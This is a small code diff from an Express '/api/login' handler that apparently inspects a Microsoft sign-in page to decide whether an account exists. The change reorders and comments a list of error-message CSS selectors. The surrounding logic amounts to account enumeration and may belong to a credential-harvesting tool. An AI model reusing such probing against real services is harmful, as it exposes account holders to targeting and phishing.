@@ -428,14 +428,14 @@ app.post('/api/login', async (req, res) => {
                     console.log('Password field detected - account exists');
                 }
 
-                // Remove bordered error messages from HTML and only capture specific "account not found" error
+                // Check for error messages (optimized order)
                 const errorSelectors = [
-                    '[role="alert"]',
-                    '.error',
-                    '.ms-TextField-errorMessage',
-                    '[data-testid="error"]',
+                    '[role="alert"]',               // Most common Microsoft error container
+                    '.ms-TextField-errorMessage',   // Microsoft specific errors
+                    '[data-testid="error"]',        // Microsoft test errors
+                    '[aria-live="polite"]',         // Screen reader errors
                     '.alert-error',
-                    '[aria-live="polite"]',
+                    '.error',
                     '.form-error'
                 ];
 
